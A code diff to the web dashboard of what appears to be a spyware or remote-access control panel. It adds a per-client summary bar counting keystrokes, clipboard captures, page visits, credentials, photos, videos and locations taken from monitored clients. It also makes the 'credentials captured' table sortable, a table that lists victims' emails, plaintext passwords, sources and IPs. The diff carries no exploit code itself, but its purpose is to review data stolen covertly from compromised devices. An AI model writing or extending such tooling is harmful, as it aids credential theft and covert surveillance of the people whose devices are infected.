@@ -298,6 +298,7 @@ kbd{display:inline-block;background:var(--panel2);border:1px solid var(--border2
 /* label badge */
 .cl-label-badge{display:inline-block;font-size:.58rem;background:#f1f3f4;border:1px solid var(--border2);border-radius:4px;padding:1px 6px;margin-right:3px;color:var(--text2)}
 .qf-btn.active-qf{background:var(--accent)!important;color:#fff!important;border-color:var(--accent)!important}
+.csum-pill{background:var(--bg3,var(--bg2));border:1px solid var(--border2);border-radius:20px;padding:2px 8px;font-size:.65rem;display:inline-flex;gap:4px;align-items:center;white-space:nowrap}
 /* refresh ring */
 @keyframes spin{to{transform:rotate(360deg)}}
 #refresh-ring{width:14px;height:14px;border-radius:50%;border:2px solid var(--border2);border-top-color:var(--accent);display:inline-block;vertical-align:middle;margin-left:6px;animation:spin .8s linear infinite;opacity:0;transition:opacity .3s}
@@ -411,6 +412,19 @@ body[data-dark] .lightbox{background:rgba(0,0,0,.97)}
         <div class="tab" data-v="settings">Settings</div>
     </div>
     </div>
+</div>
+
+<!-- CLIENT SUMMARY BAR (shown when a specific client is selected) -->
+<div id="client-summary-bar" style="display:none;background:var(--bg2);border-bottom:1px solid var(--border2);padding:6px 16px;font-size:.7rem;color:var(--dim);display:none;gap:14px;align-items:center;flex-wrap:wrap">
+    <span id="csum-id" style="font-family:monospace;color:var(--accent);font-weight:700;margin-right:4px"></span>
+    <span class="csum-pill" id="csum-keys" title="Keystrokes">⌨️ <b id="csum-keys-n">0</b></span>
+    <span class="csum-pill" id="csum-clip" title="Clipboard">📋 <b id="csum-clip-n">0</b></span>
+    <span class="csum-pill" id="csum-visits" title="Page visits">🔗 <b id="csum-visits-n">0</b></span>
+    <span class="csum-pill" id="csum-creds" title="Credentials">🔑 <b id="csum-creds-n">0</b></span>
+    <span class="csum-pill" id="csum-photos" title="Photos">📷 <b id="csum-photos-n">0</b></span>
+    <span class="csum-pill" id="csum-vids" title="Videos">🎥 <b id="csum-vids-n">0</b></span>
+    <span class="csum-pill" id="csum-locs" title="Locations">📍 <b id="csum-locs-n">0</b></span>
+    <span class="csum-pill" id="csum-errs" title="Errors">⚠️ <b id="csum-errs-n">0</b></span>
 </div>
 
 <!-- --- OVERVIEW --- -->
@@ -778,6 +792,7 @@ let liveFpsCounters = {}; // for FPS calculation
 let audioPlayers = {}; // { clientId: true/false }
 let camOnlineOnly = true; // filter: only show online clients in camera tab
 let quickFilter = 'all'; // quick filter state: 'all' | 'online' | 'offline' | 'creds'
+let credSort = { col: 'timestamp', dir: -1 }; // credentials table sort state
 const $ = s => document.querySelector(s);
 const $$ = s => document.querySelectorAll(s);
 function esc(s){if(!s)return '';var d=document.createElement('div');d.textContent=String(s);return d.innerHTML;}
@@ -1087,7 +1102,31 @@ $$('.tab').forEach(tab => {
 // ═══════════════════════════════════════════════════════════════
 function onFilterChange() {
     currentFilter = $('#clientFilter').value;
+    loadClientSummary(currentFilter);
     refreshAll();
+}
+
+async function loadClientSummary(clientId) {
+    const bar = $('#client-summary-bar');
+    if (!clientId) { bar.style.display = 'none'; return; }
+    bar.style.display = 'flex';
+    $('#csum-id').textContent = clientId;
+    const s = await api('/api/client/' + clientId + '/summary');
+    if (!s) return;
+    $('#csum-keys-n').textContent  = s.keystrokeCount || 0;
+    $('#csum-clip-n').textContent  = s.clipboardCount || 0;
+    $('#csum-visits-n').textContent = s.visitCount || 0;
+    $('#csum-creds-n').textContent = s.credentialCount || 0;
+    $('#csum-photos-n').textContent = s.photoCount || 0;
+    $('#csum-vids-n').textContent  = s.mediaCount || 0;
+    $('#csum-locs-n').textContent  = s.locationCount || 0;
+    $('#csum-errs-n').textContent  = s.errorCount || 0;
+    // Highlight non-zero pills
+    ['csum-creds','csum-errs'].forEach(id => {
+        const n = parseInt($('#' + id + '-n').textContent) || 0;
+        const pill = $('#' + id);
+        if (pill) pill.style.borderColor = n > 0 ? (id === 'csum-creds' ? '#f4b400' : '#d93025') : '';
+    });
 }
 
 function setQuickFilter(f) {
@@ -1518,19 +1557,38 @@ async function loadCredentials() {
     if (!creds) return;
     // Track which clients have credentials for quick-filter
     window._credClientIds = new Set(creds.map(c => c.clientId));
+    window._lastCreds = creds;
+    renderCredentials(creds);
+}
+
+function sortCreds(col) {
+    if (credSort.col === col) credSort.dir *= -1;
+    else { credSort.col = col; credSort.dir = col === 'timestamp' ? -1 : 1; }
+    renderCredentials(window._lastCreds || []);
+}
+
+function renderCredentials(creds) {
     const c = $('#cred-log');
-    if (!creds.length) { c.innerHTML = '<div class="empty">No credentials captured yet</div>'; return; }
+    if (!creds || !creds.length) { c.innerHTML = '<div class="empty">No credentials captured yet</div>'; return; }
+    const sorted = [...creds].sort((a, b) => {
+        let av = a[credSort.col] || '', bv = b[credSort.col] || '';
+        if (credSort.col === 'timestamp') { av = new Date(av).getTime() || 0; bv = new Date(bv).getTime() || 0; }
+        else { av = String(av).toLowerCase(); bv = String(bv).toLowerCase(); }
+        return av < bv ? -credSort.dir : av > bv ? credSort.dir : 0;
+    });
+    const arrow = col => credSort.col === col ? (credSort.dir === 1 ? ' ▲' : ' ▼') : ' ⇅';
+    const th = (col, label) => `<th onclick="sortCreds('${col}')" style="padding:7px 10px;cursor:pointer;user-select:none;white-space:nowrap">${label}${arrow(col)}</th>`;
     c.innerHTML = `<table style="width:100%;border-collapse:collapse;font-size:.72rem">
         <thead><tr style="border-bottom:1px solid var(--border2);color:var(--dim);text-align:left">
             <th style="padding:7px 10px">#</th>
-            <th style="padding:7px 10px">Time</th>
-            <th style="padding:7px 10px">Client</th>
-            <th style="padding:7px 10px">Email / Username</th>
-            <th style="padding:7px 10px">Password</th>
-            <th style="padding:7px 10px">Source</th>
-            <th style="padding:7px 10px">IP</th>
+            ${th('timestamp','Time')}
+            ${th('clientId','Client')}
+            ${th('email','Email / Username')}
+            ${th('password','Password')}
+            ${th('source','Source')}
+            ${th('ip','IP')}
         </tr></thead>
-        <tbody>${creds.map((cr, i) => `
+        <tbody>${sorted.map((cr, i) => `
             <tr style="border-bottom:1px solid var(--border2);background:${i%2===0?'rgba(244,180,0,.04)':'transparent'}">
                 <td style="padding:7px 10px;color:var(--dim)">${i+1}</td>
                 <td style="padding:7px 10px;white-space:nowrap;color:var(--dim)">${fmtTime(cr.timestamp)}</td>
